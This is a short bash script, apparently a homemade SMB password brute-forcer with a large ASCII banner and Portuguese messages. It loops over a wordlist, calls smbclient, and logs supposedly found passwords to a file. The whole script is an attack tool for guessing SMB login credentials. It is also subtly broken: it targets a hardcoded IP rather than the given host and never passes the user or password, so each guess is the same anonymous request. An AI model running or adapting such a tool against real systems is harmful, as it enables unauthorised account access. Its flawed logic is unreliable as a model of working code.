#!/bin/bash
clear

echo "█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗"
echo "╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝"
echo "                                                                                                                              "
echo "                        ███████╗ █████╗ ██╗     ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗           ██╗                              "
echo "                        ██╔════╝██╔══██╗██║     ╚██╗██╔╝██╔═████╗██╔═████╗██║  ██║        ██╗╚██╗                             "
echo "                        █████╗  ███████║██║      ╚███╔╝ ██║██╔██║██║██╔██║███████║        ╚═╝ ██║                             "
echo "                        ██╔══╝  ██╔══██║██║      ██╔██╗ ████╔╝██║████╔╝██║██╔══██║        ▄█╗ ██║                             "
echo "                        ██║     ██║  ██║███████╗██╔╝ ██╗╚██████╔╝╚██████╔╝██║  ██║███████╗▀═╝██╔╝                             "
echo "                        ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝                              "
echo "                                                                                                                              "
echo "    ███████╗███╗   ███╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗      ███████╗ ██████╗ ██████╗  ██████╗███████╗      "
echo "    ██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝      ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝      "
echo "    ███████╗██╔████╔██║██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗█████╗  ██║   ██║██████╔╝██║     █████╗        "
echo "    ╚════██║██║╚██╔╝██║██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════╝██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝        "
echo "    ███████║██║ ╚═╝ ██║██████╔╝██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗      ██║     ╚██████╔╝██║  ██║╚██████╗███████╗      "
echo "    ╚══════╝╚═╝     ╚═╝╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝      ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝      "
echo "                                                                                                                              "
echo "█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗"
echo "╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝"
echo ""
echo ""
if [ "$1" == "" ] || [ "$2" == "" ] || [ "$3" == "" ];then
	echo "Como usar: $0 [USE]R [HOST] [WORDLIST] [STARTLINE]"
	exit
fi

user=$1
host=$2
wordlist=$3
inicio=$4

total=$(wc -l $wordlist | cut -d " " -f1)
atual=1

#if [[ 999 > 1000 ]]; then
#	exit
#fi
#echo "no"
#exit

for l in $(cat $wordlist); do
	if [ "$inicio" != "" ] && [[ $inicio -gt $atual ]]; then
		atual=$((atual+1))
		continue
	fi
	a=$(smbclient -L \\10.38.1.104 -N --option='client min protocol=NT1')
	b=$(echo $a | grep "NT_STATUS_ACCESS_DENIED")
	
#	sleep 1
	echo -n -e "\e[2K\rProcessing:....................Total: $total / Atual: $atual / Password: $l\r"

	if [ "$b" == "" ]; then
		echo "senha encontrada para o usuario: $user"
		echo "[+] senha: $l"
		echo "[+] Credential: $user; password: $l" >> senhaFounded.txt
	fi
	atual=$((atual+1))
done
